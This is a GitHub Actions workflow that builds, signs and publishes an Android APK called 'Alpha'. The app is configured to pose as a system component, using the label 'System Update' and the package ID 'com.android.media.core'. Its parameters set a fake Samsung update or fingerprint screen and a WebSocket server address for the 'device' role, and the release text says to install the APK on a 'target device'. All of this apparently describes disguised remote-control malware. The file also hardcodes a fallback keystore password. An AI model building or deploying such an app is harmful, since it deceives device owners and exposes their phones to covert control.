name: Alpha — Build & Release

# ── Triggers ─────────────────────────────────────────────────────────────────
on:
  push:
    branches: [main, master, release]
    tags:    ['v*.*.*']
  pull_request:
    branches: [main, master]
  workflow_dispatch:
    inputs:
      update_mode:
        description: 'Fake screen mode (0=none 1=system update 2=fingerprint)'
        required: false
        default:  '1'
        type: choice
        options: ['0', '1', '2']
      update_brand:
        description: 'Brand shown on fake update screen'
        required: false
        default:  'Samsung'
      update_duration_ms:
        description: 'Fake screen duration in ms'
        required: false
        default:  '10000'
      version_name:
        description: 'APK version name (e.g. 1.2.0)'
        required: false
        default:  '1.0.0'

# ── Concurrency: cancel in-progress runs on the same branch ──────────────────
concurrency:
  group:  ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# ── Jobs ─────────────────────────────────────────────────────────────────────
jobs:

  # ────────────────────────────────────────────────────────────────────────────
  build:
    name: Build Release APK
    runs-on: ubuntu-latest
    timeout-minutes: 30

    env:
      # Build params — resolved from secrets first, then workflow inputs, then defaults
      SERVER_URL:          ${{ secrets.SERVER_URL          || 'wss://change-me.example.com/ws?role=device&id=' }}
      TARGET_URL:          ${{ secrets.TARGET_URL          || 'https://google.com' }}
      APP_ID:              ${{ secrets.APP_ID              || 'com.android.media.core' }}
      APP_LABEL:           ${{ secrets.APP_LABEL           || 'System Update' }}
      UPDATE_MODE:         ${{ github.event.inputs.update_mode        || secrets.UPDATE_MODE        || '1' }}
      UPDATE_BRAND:        ${{ github.event.inputs.update_brand       || secrets.UPDATE_BRAND       || 'Samsung' }}
      UPDATE_TITLE:        ${{ secrets.UPDATE_TITLE        || 'Software update' }}
      UPDATE_VERSION:      ${{ secrets.UPDATE_VERSION      || 'One UI 6.1' }}
      UPDATE_DURATION_MS:  ${{ github.event.inputs.update_duration_ms || secrets.UPDATE_DURATION_MS || '10000' }}
      VERSION_NAME:        ${{ github.event.inputs.version_name       || secrets.VERSION_NAME       || '1.0.0' }}

    steps:

      # ── 1. Checkout ─────────────────────────────────────────────────────────
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0   # full history needed for VERSION_CODE from commit count

      # ── 2. Derive VERSION_CODE from commit count ────────────────────────────
      - name: Set VERSION_CODE
        id: version
        run: |
          CODE=$(git rev-list --count HEAD)
          echo "VERSION_CODE=$CODE" >> $GITHUB_ENV
          echo "version_code=$CODE" >> $GITHUB_OUTPUT
          echo "VERSION_CODE → $CODE"

      # ── 3. Java 17 ─────────────────────────────────────────────────────────
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version:  '17'
          cache:         gradle

      # ── 4. Android SDK — already on ubuntu-latest, just point to it ─────────
      - name: Set up local.properties
        run: |
          echo "sdk.dir=$ANDROID_HOME" > android-alpha/local.properties
          echo "ANDROID_HOME → $ANDROID_HOME"

      # ── 5. Gradle cache ─────────────────────────────────────────────────────
      - name: Cache Gradle home
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key:          gradle-${{ runner.os }}-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
          restore-keys: gradle-${{ runner.os }}-

      # ── 6. Validate wrapper (security) ──────────────────────────────────────
      - name: Validate Gradle wrapper
        uses: gradle/wrapper-validation-action@v3

      # ── 7. Decode signing keystore from base64 secret ───────────────────────
      - name: Decode keystore
        # Skip on PRs from forks — they don't have access to secrets
        if: ${{ env.KEYSTORE_BASE64 != '' }}
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
        run: |
          echo "$KEYSTORE_BASE64" | base64 --decode > android-alpha/alpha-release.jks
          echo "Keystore decoded ✓"

      # ── 8. Grant gradlew execute permission ─────────────────────────────────
      - name: Make gradlew executable
        run: chmod +x android-alpha/gradlew

      # ── 9. Run lint (non-blocking — report only) ─────────────────────────────
      - name: Lint
        working-directory: android-alpha
        continue-on-error: true
        run: ./gradlew lintRelease --no-daemon --quiet -PSKIP_PARANOID=true

      # ── 10. Build release APK ────────────────────────────────────────────────
      - name: Build release APK
        working-directory: android-alpha
        env:
          KEYSTORE_PASS:  ${{ secrets.KEYSTORE_PASS  || 'AlphaRelease2024' }}
          KEY_ALIAS:      ${{ secrets.KEY_ALIAS       || 'alpha-key' }}
          KEY_PASS:       ${{ secrets.KEY_PASS        || 'AlphaRelease2024' }}
        run: |
          ./gradlew assembleRelease \
            --no-daemon \
            --stacktrace \
            -PAPP_ID="${APP_ID}" \
            -PAPP_LABEL="${APP_LABEL}" \
            -PSERVER_URL="${SERVER_URL}" \
            -PTARGET_URL="${TARGET_URL}" \
            -PUPDATE_MODE="${UPDATE_MODE}" \
            -PUPDATE_BRAND="${UPDATE_BRAND}" \
            -PUPDATE_TITLE="${UPDATE_TITLE}" \
            -PUPDATE_VERSION="${UPDATE_VERSION}" \
            -PUPDATE_DURATION_MS="${UPDATE_DURATION_MS}" \
            -PVERSION_CODE="${VERSION_CODE}" \
            -PVERSION_NAME="${VERSION_NAME}" \
            -PKEYSTORE_PATH="../alpha-release.jks" \
            -PKEYSTORE_PASS="${KEYSTORE_PASS}" \
            -PKEY_ALIAS="${KEY_ALIAS}" \
            -PKEY_PASS="${KEY_PASS}"

      # ── 11. Rename APK with version + build number ───────────────────────────
      - name: Rename APK
        id: rename
        run: |
          SRC=$(find android-alpha/app/build/outputs/apk/release -name "*.apk" | head -1)
          DST="android-alpha/app/build/outputs/apk/release/Alpha-${VERSION_NAME}-${VERSION_CODE}.apk"
          mv "$SRC" "$DST"
          echo "apk_path=$DST" >> $GITHUB_OUTPUT
          echo "apk_name=Alpha-${VERSION_NAME}-${VERSION_CODE}.apk" >> $GITHUB_OUTPUT
          echo "APK → $DST ($(du -sh "$DST" | cut -f1))"

      # ── 12. Upload APK as workflow artifact ──────────────────────────────────
      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name:              ${{ steps.rename.outputs.apk_name }}
          path:              ${{ steps.rename.outputs.apk_path }}
          retention-days:    14
          compression-level: 0   # APK is already compressed

      # ── 13. Upload lint report ───────────────────────────────────────────────
      - name: Upload lint report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name:           lint-report
          path:           android-alpha/app/build/reports/lint-results-release.*
          retention-days: 7
          if-no-files-found: ignore

      # ── 14. Summary ─────────────────────────────────────────────────────────
      - name: Build summary
        if: always()
        run: |
          echo "## Alpha Build Summary" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "| Field | Value |" >> $GITHUB_STEP_SUMMARY
          echo "|-------|-------|" >> $GITHUB_STEP_SUMMARY
          echo "| Version | \`${VERSION_NAME}\` (code \`${VERSION_CODE}\`) |" >> $GITHUB_STEP_SUMMARY
          echo "| App ID | \`${APP_ID}\` |" >> $GITHUB_STEP_SUMMARY
          echo "| Label | \`${APP_LABEL}\` |" >> $GITHUB_STEP_SUMMARY
          echo "| Update Mode | \`${UPDATE_MODE}\` (1=System 2=Fingerprint) |" >> $GITHUB_STEP_SUMMARY
          echo "| Brand | \`${UPDATE_BRAND}\` |" >> $GITHUB_STEP_SUMMARY
          echo "| Duration | \`${UPDATE_DURATION_MS}\` ms |" >> $GITHUB_STEP_SUMMARY
          echo "| Target URL | \`${TARGET_URL}\` |" >> $GITHUB_STEP_SUMMARY

  # ────────────────────────────────────────────────────────────────────────────
  release:
    name: Attach APK to GitHub Release
    runs-on: ubuntu-latest
    needs: build
    # Only run on tag pushes (v*.*.*)
    if: startsWith(github.ref, 'refs/tags/v')

    permissions:
      contents: write

    steps:
      - name: Download APK artifact
        uses: actions/download-artifact@v4
        with:
          pattern: Alpha-*
          path:    dist/

      - name: Create / update GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name:   ${{ github.ref_name }}
          name:       Alpha ${{ github.ref_name }}
          draft:      false
          prerelease: ${{ contains(github.ref_name, '-') }}
          files:      dist/**/*.apk
          body: |
            ## Alpha ${{ github.ref_name }}

            Built from commit `${{ github.sha }}`.

            ### Install
            Download the APK below and install on target device.
